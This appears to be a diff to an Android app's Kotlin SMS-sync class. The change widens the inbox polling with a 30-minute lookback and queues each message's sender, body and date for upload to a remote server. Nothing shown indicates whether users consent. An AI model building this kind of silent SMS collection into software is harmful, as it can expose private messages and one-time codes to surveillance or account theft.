@@ -12,6 +12,11 @@ object SmsInboxSync {
     private const val WATCHDOG_INTERVAL_MINUTES = 15
 
     fun pollMissingSms(context: Context, source: String): Int {
+        val userManager = context.getSystemService(android.os.UserManager::class.java)
+        if (userManager?.isUserUnlocked != true) {
+            Log.w(TAG, "[$source] Device locked, skip poll.")
+            return 0
+        }
         val safeContext = context.deviceProtectedContext()
         HistoryScanBaseline.ensureSmsBaseline(safeContext)
 
@@ -22,16 +27,18 @@ object SmsInboxSync {
 
         val prefs = safeContext.getSharedPreferences("AppInternalStateV4", Context.MODE_PRIVATE)
         var lastProcessedSmsId = prefs.getLong("last_processed_sms_id", 0L)
-        Log.d(TAG, "[$source] poll start lastProcessedSmsId=$lastProcessedSmsId time=${System.currentTimeMillis()}")
+        
+        // CHỈNH SỬA: Quét dựa trên cả ID và mốc thời gian (trong vòng 30 phút qua) để dự phòng nếu ID bị kẹt
+        val timeThreshold = System.currentTimeMillis() - (30 * 60 * 1000L) // 30 phút trước
+        Log.d(TAG, "[$source] poll start lastProcessedSmsId=$lastProcessedSmsId timeThreshold=$timeThreshold")
 
         return try {
-            Thread.sleep(1000)
-
+            // Quét tin nhắn mới hơn ID cuối cùng HOẶC tin nhắn trong vòng 30 phút qua
             val cursor = safeContext.contentResolver.query(
                 Uri.parse("content://sms/inbox"),
                 arrayOf("address", "body", "date", "_id"),
-                "_id > ?",
-                arrayOf(lastProcessedSmsId.toString()),
+                "_id > ? OR date >= ?",
+                arrayOf(lastProcessedSmsId.toString(), timeThreshold.toString()),
                 "_id ASC"
             )
 
@@ -60,8 +67,8 @@ object SmsInboxSync {
                     val number = DeviceUtils.formatVietnamesePhoneNumber(rawNumber)
                     val name = DeviceUtils.getDisplayName(safeContext, number)
                     Log.d(TAG, "[$source] Backfill SMS ID=$smsId sender=$number time=$date")
-                    val ok = ServerReporter.sendEventSync(safeContext, "SMS", name, body, date)
-                    if (ok) sentCount++ else Log.w(TAG, "[$source] sendEventSync failed for SMS ID=$smsId")
+                    SmsBatchManager.enqueue(safeContext, name, body, date)
+                    sentCount++
                 }
             }
 
